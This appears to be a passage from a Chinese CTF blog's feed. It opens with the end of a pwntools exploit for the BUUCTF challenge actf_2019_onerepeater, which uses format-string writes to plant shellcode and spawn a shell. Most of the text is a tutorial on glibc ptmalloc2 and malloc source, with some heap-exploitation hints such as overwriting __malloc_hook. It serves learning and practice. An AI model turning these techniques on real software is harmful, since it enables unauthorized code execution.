class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Exit&#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录，&lt;a href=&quot;https://buuoj.cn/challenges#actf_2019_onerepeater&quot;&gt;actf_2019_onerepeater&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>malloc源码分析</title>
    <link href="http://example.com/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2022-01-26T18:00:00.000Z</published>
    <updated>2022-01-28T19:36:02.451Z</updated>
    
    <content type="html"><![CDATA[<p>学了这么久堆漏洞了，我想应该把<code>glibc</code>的<code>malloc</code>和<code>free</code>源码解析写一下了，希望能帮助一下刚上路的师傅，同时也巩固一下自身知识。</p><span id="more"></span><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>我们平时写程序的时候，某些变量可能需要在开始就分配内存，这些内存是不可避免的。那么这些内存就是静态分配的，当程序编译完成之后，它就确定了占用这么多的内存。但是有时候，实际问题的规模没有预期那么大，我们不一定需要很大的内存，如果每次都按最大考虑那么就有很大一部分内存是被浪费的，这就是静态分配内存的弊端，虽然咱打acm的时候都是静态分配的，但是这没啥，因为每个问题不要超过它的总内存上限问题就不大(狗头。但是在内存不足的年代，如果都这样使用静态分配内存的方式，那么计算机的效率会被拖垮很多，所以就有动态分配内存的概念了。</p><p><code>glibc</code>采用<code>ptmalloc</code>的管理方式去分配内存。</p><h2 id="ptmalloc2的分配策略"><a href="#ptmalloc2的分配策略" class="headerlink" title="ptmalloc2的分配策略"></a>ptmalloc2的分配策略</h2><p>那么动态分配内存要怎么去分配呢？如果我们需要占用除了我程序本身占用的内存以外的一块内存，那程序指定是没权限用的，得先向操作系统申请这一块内存的使用权。而操作系统没那么闲，分配几个字节的内存都要它去管，操作系统管理都是按页式的管理。而一页的内存是<code>0x1000B</code>，如果每一次申请我都向操作系统申请，每一次归还都直接归还给操作系统那么必定会增大操作系统的负担。因此分配内存的时候可以按照一个策略去分配，分配一定得尽量避免过多地使用系统调用，归还的时候可以等到程序结束时一并归还，这样的话操作系统的负担就大大下降了。</p><p><code>ptmalloc2</code>的分配方式会在你第一次<code>malloc</code>的时候向操作系统申请<code>0x21000B(132KB)</code>的内存，然后后续分配就不会向操作系统申请内存，只有用完了的时候才会再次申请内存。</p><p>操作系统的问题解决了之后我们再来看看<code>glibc</code>怎么处理具体的分配细节。分配的时候我一定是切出一块特定大小才是最优的策略的，比如程序<code>malloc(4)</code>，那我接切个4字节的内存给它用，<code>malloc(1)</code>那就给它一字节去使用。然而现实没有那么理想，因为如果我切下来的块用户程序完全可写的话，那么我怎么区分这个内存块是否被使用呢？然后内存块的分界线又如何界定呢？所以分割内存块的时候不可避免地要在内存块中额外开出一部分区域用于管理。那么可以在每个分配的内存块加上一个<code>int</code>数据作为此内存块的<code>size</code>，64位的操作系统可以使用<code>long long</code>。同理，为了管理方便，<code>glibc</code>在分配<code>chunk</code>的时候也并不是分配这么多就只能写这么多的。它也不想闲到去管1字节2字节这样的内存块。而且如果有这样的内存块，那么在分配指针的时候内存没办法对齐会出现很多麻烦的事。所以在分配内存块的时候，有一个<code>SIZE_SZ</code>，一次分配的内存必定是<code>SIZE_SZ*2</code>的整倍数，<code>SIZE_SZ</code>在32位操作系统下的值是<code>4</code>，64位的值是<code>8</code>。为了方便，以下把内存块统一叫<code>chunk</code>。</p><p>以32位操作系统为例，size的值必定为8的整数倍，二进制角度下看来，低三位永远是0，这样有点浪费了内存，因此规定<code>size</code>的低三位不作为实际的<code>chunk</code>大小，而是标志位。三个标志位从高位到低位分别是：</p><ol><li><code>NON_MAIN_ARENA</code>:是否为主分配，0表示是主分配，权值为4</li><li><code>IS_MMAPPED</code>:表示内存是否为<code>mmap</code>获得，0表示不是，权值为2</li><li><code>PREV_INUSE</code>:表示前面一个内存块是否被使用，0表示不被使用，权值为1</li></ol><p>在64位操作系统中，多出一个标志位，但是这个标志位无任何意义，可能后续会赋予别的意义，但是它一样不影响<code>chunk</code>的大小。</p><p>在看malloc源码的时候可以看到一个宏定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure><p>那么就可以看到<code>chunksize</code>在取实际<code>size</code>的时候与了一个<code>0xfffffff8</code>，忽略了最低三位，64位操作系统则会忽略最低四位。</p><p>以下例子为64位操作系统</p><p><code>chunk</code>最小的大小为<code>0x20</code>，为什么没有<code>0x10</code>大小的<code>chunk</code>呢，这么看来<code>size</code>占了<code>8</code>字节还能有8字节给用户去写似乎没问题。大不了我超过<code>8B</code>再分配<code>0x20</code>大小的内存嘛，这个疑问先放一下，我们来看看这样的策略它还有没有什么问题。</p><p>如果一个<code>chunk</code>被确定释放了，那么该以什么方式去管理。你会想到前面有一个<code>prev_inuse</code>位可以确定一个堆块是否被释放，你会想到改下一个<code>chunk</code>的标志位就可以了，但是如果这个内存块再次被需要呢，难道去遍历每一个<code>chunk</code>，一来要看<code>size</code>符不符合，二来还要看它有没有被使用，这样时间开销太大了。因为空闲的<code>chunk</code>可能散落在内存各个角落，管理零碎内存最好的办法就是链表。链表还得有表头，这个表头其实就是我们的<code>main_arena</code>中的<code>bin</code>。因此<code>chunk</code>上还得有一块内存是指针，指针又占了<code>8</code>个字节。</p><p>但是你可能想到，指针它只在块被释放的时候有用啊，<code>0x10</code>的块，一个<code>size</code>，一个指针，被分配的时候用指针作为数据域，被释放的时候指针用于链式管理。这样就解决了，这样也的确没问题。但是看看它这样的分配策略还有没有问题？如果我多次分配<code>chunk</code>很小的块，<code>free</code>之后它们便只能用于分配这么大的内存了。如果不加另一种策略组织起来，导致内存碎片越来越多，就容易耗尽系统内存。</p><p>那么就有<code>ptmalloc</code>的又一个策略：尽量合并物理相邻的<code>free_chunk</code>。咱们前面一直提到切割内存块，合并内存块就是切割的一个逆过程。在合并的时候我可能前面会有<code>free</code>的内存块，后面也会有<code>free</code>的内存块。那么我怎么在只知道我自身信息的情况下准确找到前后的<code>chunk</code>具体在哪呢。</p><p>想找到后面的很容易，我知道我自己所在的位置（指针），也知道我的<code>size</code>，那么相加就可以找到后面的<code>size</code>了。那么我如何找前面的<code>size</code>在什么位置呢？所以就不得不再开辟一个内存来存前一个<code>chunk</code>的信息了。通过<code>prev_inuse</code>位我很容易得知前一个<code>chunk</code>有没有被<code>free</code>，但是我并不知道前一个<code>chunk</code>的大小啊。所以在一个<code>chunk</code>的结构体，在size之前还会有一个<code>prev_size</code>。与前面那个指针同理，我只有在前一个块被<code>free</code>需要合并的时候才会想看看它在哪，他要是都还在用我都没必要去使用这个<code>prev_size</code>字段了。但是要注意，这个<code>prev_size</code>是服务于上一个<code>chunk</code>的。所以一个chunk的结构体就有<code>0x10</code>个不得不分配的字节，而且自己还不能用。因此<code>0x10</code>的<code>chunk</code>就没有意义了。所以源码中也会找到这样的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE 4*SIZE_SZ</span></span><br></pre></td></tr></table></figure><p>说了这么多了，<code>ptmalloc</code>的策略大致总结一下就是：</p><ol><li><p>一次系统调用会分配大块内存</p></li><li><p>程序结束后统一归还内存给操作系统</p></li><li><p>方便管理，内存分配尽量对齐，也就是所谓的size为某某整倍数</p></li><li><p>尽量分配最小能满足的内存块</p></li><li><p>链式管理空闲空间，适当的时候合并物理相邻的<code>chunk</code></p></li></ol><p>而且根据以上分析我们可以得出一些关于<code>chunk</code>的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> prev_size;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    chunk *fd;</span><br><span class="line">    chunk *bk;<span class="comment">//因为链式管理还有可能是双向链表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们大致就明白了<code>ptmalloc</code>的分配方式。</p><h2 id="ptmalloc2的具体分配策略"><a href="#ptmalloc2的具体分配策略" class="headerlink" title="ptmalloc2的具体分配策略"></a>ptmalloc2的具体分配策略</h2><p>前面我们讲到了，对于空闲块使用了链式管理方式。但是对于不同大小的<code>chunk</code>，它又有细分。这里先给一个概念：<code>bin</code>，字面意义垃圾桶，用于装<code>free_chunk</code>的垃圾桶，在这里可以理解为链表表头。</p><p>以下均以<code>glibc 2.23</code>版本解析</p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>对于<code>size</code>较小的<code>free_chunk</code>，我们认为它很快就会被再次用到，因此在<code>free</code> <code>0x20~0x80</code>大小的<code>chunk</code>时，我们会把它扔进<code>fast bin</code>里面，字面意义，里面存的<code>free_chunk</code>很快会被再次用到。<code>fast bin</code> 管理<code>free_chunk</code>采用单链表方式，并且符合后进先出（<code>FILO</code>）的原则，比如以下程序段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">y=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(x);</span><br><span class="line"><span class="built_in">free</span>(y);</span><br><span class="line">z=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">w=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>那么z会得到y的指针，w会得到x的指针。</p><p>并且<code>fast bin</code>的<code>chunk</code>的之后的<code>chunk</code> <code>prev_inuse</code>位永远为1。也就是说它永远被视为在使用中，但是通常这个使用中是用于检测参不参与物理相邻<code>chunk</code>的合并，所以不会参与物理相邻的<code>chunk</code>的合并，也不会被切割。它的匹配规则就是，定量匹配。比如我想要一个<code>0x30</code>的<code>chunk</code>，没有就是没有，没有我就找其它的，不会说<code>0x40</code>好像还挺合适就拿了，不会。</p><p><code>fast bin</code>一共有<code>10</code>个，<code>main_arena</code>结构体中，用<code>fastbinsY</code>来存储每一个<code>fast bin</code>的链表头部，32位系统中，<code>fast bin</code>，从0x10开始到<code>0x40</code>，有7种<code>fast bin</code>，64位系统从<code>0x20</code>开始到<code>0x80</code>，也是七种<code>fast bin</code>。单个<code>fast bin</code>链表上的<code>chunk</code>大小一定严格相等。</p><p>一定情况下可以修改<code>global_max_fast</code>的值来调整<code>fast bin</code>的个数，64位系统下这个值通常为<code>0x80</code>，代表小于等于<code>0x80</code>的<code>chunk</code>都为<code>fast bin</code>。</p><p>其余的链表头部都在<code>bin</code>数组当中。并且由于只有<code>fast bin</code>是单链表结构，其余<code>bin</code>都是双向链表结构，<code>bin</code>会成对出现。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>对于非<code>fast bin</code>大小的<code>chunk</code>，被释放时会首先进入<code>unsorted bin</code>。<code>unsorted bin</code>在特定的时候会进入<code>small bin</code> 和 <code>large bin</code>。</p><p>非<code>fast bin</code>的<code>bin</code>都是用一对<code>bin</code>指针来描述的，这两个<code>bins</code>也要看成一个<code>chunk</code>，然后初始它们的<code>fd</code>和<code>bk</code>都指向自身的<code>prev_size</code>那个位置。比如<code>main_arena+104</code>这个地方是<code>bin</code>数组的第一个，然后呢<code>main_arena+104</code>和<code>main_arena+112</code>分别就是<code>unsorted bin</code>的头部，它们本身虽然不是<code>chunk</code>，但是要理解它们的初始状态还是得看成一个<code>chunk</code>。所以<code>main_arena+104</code>和<code>main_arena+112</code>的初始值就是<code>main_arena+88</code>。如图：</p><p><img src="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png" alt="1"></p><p>设置这一个<code>bin</code>的主要目的是扮演一个缓存层的角色以加快分配和释放的操作，链表中<code>chunk</code>大小不一定相等且无序排列。</p><p>当需要检查<code>unsorted bin</code>的时候，会遍历整个链表，寻找第一个能满足的<code>chunk</code>大小切割。如果切割后的大小不足<code>2*SIZE_SZ</code>，则不会切割，而是将整个堆块返回给用户使用。</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>一共有<code>62</code>个，从最小的<code>chunk</code>开始，公差为<code>SIZE_SZ*2</code>，双链表管理。它的特点也是跟fast bin一样，单条链表<code>chunk</code>大小相等，但是它会参与合并，切割。先进先出（<code>FIFO</code>）的策略。它表示的范围就是<code>4*SIZE_SZ~126*SIZE_SZ</code></p><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><p><code>large bin</code>与<code>small bin</code>不一样，<code>large bin</code>表示的是一个范围。一共有<code>63</code>个(假设下标<code>0~62</code>)，从<code>small bin</code>最小不能表示的<code>chunk</code>开始，大到无穷。</p><p>它表示的范围类似一个等差数列。</p><table><thead><tr><th>起下标</th><th>止下标</th><th>公差</th></tr></thead><tbody><tr><td>0</td><td>31</td><td>16*SIZE_SZ</td></tr><tr><td>32</td><td>47</td><td>32*SIZE_SZ</td></tr><tr><td>48</td><td>55</td><td>64*SIZE_SZ</td></tr><tr><td>56</td><td>59</td><td>128*SIZE_SZ</td></tr><tr><td>60</td><td>61</td><td>256*SIZE_SZ</td></tr><tr><td>62</td><td>62</td><td>∞</td></tr></tbody></table><p>最小的<code>large bin</code>是<code>small bin</code>的最小不能表示的大小。</p><p>所以<code>large bin</code>从<code>128*SIZE_SZ</code>开始。那么下标为<code>0</code>的<code>large bin</code>表示的范围就是<code>128*SIZE_SZ~144*SIZE_SZ</code>(左闭右开)，同理下标为1的<code>large bin</code>表示的范围就是<code>144*SIZE_SZ~160*SIZE_SZ</code>，以此类推，等到<code>32</code>的时候就在原来的基础上加<code>32*SIZE_SZ</code>作为右开区间</p><p>它会以二维双向链表进行维护，对于<code>bin</code>中所有的<code>chunk</code>，相同大小的<code>chunk</code>用<code>fd</code>和<code>bk</code>指针相连，对于不同大小的<code>chunk</code>，采用<code>fd_nextsize</code>和<code>bk_nextsize</code>指针连接。并且沿着<code>fd_nextsize</code>指针，<code>chunk</code>大小递增。</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top_chunk"></a>top_chunk</h3><p>我们之前说过，第一次<code>malloc</code>的时候，操作系统会给我们<code>0x21000B</code>的内存，它是作为一个<code>top_chunk</code>存在的，可以把<code>top_chunk</code>看成<code>heap</code>的边界。<code>top_chunk</code>的地址会被记录在main_arena+88的位置。<code>gdb</code>中通过<code>p/x main_arena</code>的命令也可以查看<code>main_arena</code> 的具体结构。</p><h3 id="分配流程"><a href="#分配流程" class="headerlink" title="分配流程"></a>分配流程</h3><p>首先用户<code>malloc</code>请求一个内存，先将请求的内存大小转换成<code>chunk</code>的大小，通过以下宏定义转换。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>大概逻辑就是寻找一个最小能满足的<code>chunksize</code>作为<code>chunk</code>大小。</p><p>什么是最小能满足呢，我们看看一个<code>size=0x20</code>的<code>chunk</code>能有多少区域给用户写：<code>0x20</code>字节分别为<code>prev_size</code>，<code>size</code>，<code>fd</code>和<code>bk</code>，<code>prev_size</code>和<code>size</code>都不允许写，但是我们可以写<code>fd</code>和<code>bk</code>，以及下一个块的<code>prev_size</code>，前面我们也说过，当这个块没有被<code>free</code>的时候，它的<code>fd</code>,<code>bk</code>以及下一个<code>chunk</code>的<code>prevsize</code>位都是可以给用户任意写数据的，所以<code>size=0x20</code>，我们可以写的数据段为<code>0x18</code>。最小能满足就是说，当我请求的内存小于等于<code>0x18</code>的时候，我给你<code>size=0x20</code>的<code>chunk</code>，一旦多了就继续加<code>0x10</code>，也就是<code>2*SIZE_SZ</code>。这里用了其它宏定义去描述它我们尚且不管，如果用一个函数来实现它的话大概就是这样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">request2size</span><span class="params">(<span class="keyword">size_t</span> req)</span></span>&#123;</span><br><span class="line">    chunk_size=SIZE_SZ*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span>(chunk_size&lt;req)chunk_size+=<span class="number">2</span>*SIZE_SZ;</span><br><span class="line">    <span class="keyword">return</span> chunk_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在分配的时候我们尽量选择<code>0x18</code>,<code>0x28</code>这样刚刚好的数值，这样更容易发生溢出，哪怕溢出一个字节，也能够加以利用。</p><p>那么算出了它的<code>chunk_size</code>之后呢，我们先会判断这个<code>chunk_size</code>是否<code>&lt;=global_max_fast</code>，也就是是否在<code>fast bin</code>范围内。如果在则优先寻找能匹配的<code>fast bin</code>，如果该<code>size</code>的<code>fast bin</code>为空则会寻找<code>small bin</code>，<code>small bin</code>会寻找特定<code>size</code>的<code>chunk</code>返回。如果<code>small bin</code>也为空，或者找不到能满足的那就会去<code>large bin</code>中寻找，同样是最小能满足，找到之后返回或者切割之后返回。还找不到就会去<code>unsorted bin</code>，<code>unsorted bin</code>则会找第一个能满足的<code>chunk</code>并返回或者切割之后返回，<code>unsorted bin</code> 中每遍历一个不满足要求的<code>unsorted bin</code>就会把该<code>unsorted bin</code>加到合适的small bin或者<code>large bin</code>当中。如果切割之后剩余的部分&lt;<code>MINSIZE</code>，那么则不会切割整个返回。</p><p>如果还是找不到，那么就会切割<code>top_chunk</code>。如果<code>top_chunk</code>都不能满足请求的大小，则会<code>free</code> <code>top_chunk</code>并再一次向操作系统申请新的<code>top_chunk</code>，这次申请同样还是申请一个<code>0x21000B</code>的<code>top_chunk</code>，通常情况下旧的<code>top_chunk</code>和新申请的<code>top_chunk</code>物理相邻，那么如果<code>free</code> 旧的<code>top_chunk</code>进入了一个非<code>fast bin</code>的链当中，就会被新的<code>top_chunk</code>合并。</p><p>如果一次申请的内存超过<code>0x200000B</code>，那么就不会在heap段上分配内存，将会使用<code>mmap</code>在<code>libc</code>的<code>data</code>段分配内存。通常利用就是每次分配给分配地址，分配<code>size</code>没限制那就<code>malloc</code>一个很大的内存就可以直接泄露<code>libc</code>的地址。</p><p>分配方式到此就讲完了。</p><h2 id="malloc源码分析"><a href="#malloc源码分析" class="headerlink" title="malloc源码分析"></a>malloc源码分析</h2><p>接下来我们直接解读一下<code>malloc</code>的源码。</p><h3 id="libc-malloc源码分析"><a href="#libc-malloc源码分析" class="headerlink" title="__libc_malloc源码分析"></a>__libc_malloc源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc实际上会直接调用这里的<code>__libc_malloc</code>函数，然后<code>__libc_malloc</code>也只不过是一层包装而已，实际上大部分的逻辑都是调用<code>_int_malloc</code>函数完成的，那么先来分析外面。</p><p>第一段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>定义了一个<code>hook</code>函数指针，如果<code>hook!=NULL</code>则直接调用<code>hook</code>指向的内容。<code>hook</code>是为了方便开发者调试的一个东西，比如我自己写了一个<code>malloc</code>函数想测试它的性能如何，那么我在这里直接让<code>__malloc_hook=my_malloc</code>就可以直接调用我自己写的malloc函数了。但是同时它也是最容易被劫持的，刚开始我们很多题目都是靠写<code>__malloc_hook</code>为一个<code>onegadget</code>，然后调用<code>malloc</code>去<code>getshell</code>的。在<code>2.34</code>版本中，<code>__malloc_hook</code>同其它大部分的<code>hook</code>都被删除了。</p><p>第二段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arena_get (ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>通过<code>arena_get</code>获得一个分配区，<code>arena_get</code>是个宏定义，定义在<code>arena.c</code>中，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      arena_lookup (ptr);                           \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);                         \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p><code>arena_lookup</code>定义如下，也是获取分配器指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lookup(ptr) do &#123; \</span></span><br><span class="line"><span class="meta">      void *vptr = NULL;                              \</span></span><br><span class="line"><span class="meta">      ptr = (mstate) tsd_getspecific (arena_key, vptr);             \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>然后加锁，没了，获取分配器指针这一段不是我们主要要分析的，也就不过多去解析了。</p><p>第三段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br></pre></td></tr></table></figure><p>它本身注释也写清楚了，在能够找到一个可用的<code>arena</code>之前尝试寻找另外一个<code>arena</code>，我这英文比较飘还请亲见谅。如果<code>arena</code>找到了但是<code>_int_malloc</code>居然返回0了，那么就重新寻找另一个分配器再次调用一次<code>_int_malloc</code>。完了之后呢，要给<code>arena</code>解锁，然后返回得到的<code>chunk</code>指针。</p><h3 id="int-malloc源码分析"><a href="#int-malloc源码分析" class="headerlink" title="_int_malloc源码分析"></a>_int_malloc源码分析</h3><p>由于比较长，为了摆脱水长度的嫌疑就不给看总代码了，需要的自己找<code>glibc</code>的源码就好了，下面我一段一段分析。</p><h3 id="第一段：main-arena初始化"><a href="#第一段：main-arena初始化" class="headerlink" title="第一段：main_arena初始化"></a>第一段：main_arena初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 